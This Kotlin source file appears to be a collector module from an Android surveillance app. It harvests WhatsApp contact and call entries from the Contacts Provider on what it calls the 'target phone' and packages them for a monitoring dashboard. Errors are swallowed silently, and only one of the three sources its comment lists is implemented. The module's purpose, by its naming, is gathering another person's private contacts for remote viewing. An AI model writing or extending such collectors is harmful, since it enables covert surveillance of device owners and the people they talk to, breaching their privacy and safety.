package com.spapp.monitoring.collectors

import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.local.WhatsAppMessageEntry

/**
 * Collects all contacts and WhatsApp chat counterparts from the device:
 * 1. Android Contacts Provider: scans WhatsApp raw contacts (MIMETYPE vnd.android.cursor.item/vnd.com.whatsapp.profile)
 * 2. General Phone Contacts: scans all address book contacts
 * 3. Recent Call/SMS logs: falls back to cached contact names & numbers
 *
 * This ensures that the user's complete chatlist and contacts on the target phone
 * are surfaced in the dashboard WhatsApp view.
 */
class WhatsAppContactsCollector(private val context: Context) {

    fun hasContactsPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS) ==
            PackageManager.PERMISSION_GRANTED

    fun collectAllWhatsAppContacts(): List<WhatsAppMessageEntry> {
        val contactMap = LinkedHashMap<String, WhatsAppMessageEntry>()
        val now = System.currentTimeMillis()

        // 1. Direct WhatsApp Contacts from ContactsContract.Data
        try {
            val uri = ContactsContract.Data.CONTENT_URI
            val projection = arrayOf(
                ContactsContract.Data.DISPLAY_NAME,
                ContactsContract.Data.DATA1,
                ContactsContract.Data.DATA3,
                ContactsContract.Data.MIMETYPE
            )
            val selection = "${ContactsContract.Data.MIMETYPE} IN (?, ?, ?, ?)"
            val selectionArgs = arrayOf(
                "vnd.android.cursor.item/vnd.com.whatsapp.profile",
                "vnd.android.cursor.item/vnd.com.whatsapp.w4b.profile",
                "vnd.android.cursor.item/vnd.com.whatsapp.voip.call",
                "vnd.android.cursor.item/vnd.com.whatsapp.w4b.voip.call"
            )

            context.contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                val nameIdx = cursor.getColumnIndex(ContactsContract.Data.DISPLAY_NAME)
                val jidIdx = cursor.getColumnIndex(ContactsContract.Data.DATA1)
                val descIdx = cursor.getColumnIndex(ContactsContract.Data.DATA3)

                while (cursor.moveToNext()) {
                    val name = if (nameIdx >= 0) cursor.getString(nameIdx)?.trim() else null
                    if (!name.isNullOrBlank()) {
                        val desc = if (descIdx >= 0) cursor.getString(descIdx) else null
                        val jid = if (jidIdx >= 0) cursor.getString(jidIdx) else null
                        val key = name.lowercase()
                        if (!contactMap.containsKey(key)) {
                            contactMap[key] = WhatsAppMessageEntry(
                                chatName = name,
                                sender = name,
                                messageText = desc ?: jid ?: "WhatsApp Contact",
                                isOutgoing = false,
                                messageTimeEpochMs = now
                            )
                        }
                    }
                }
            }
        } catch (_: Exception) {
            // Contacts provider query error or permission denied
        }

        return contactMap.values.toList()
    }
}
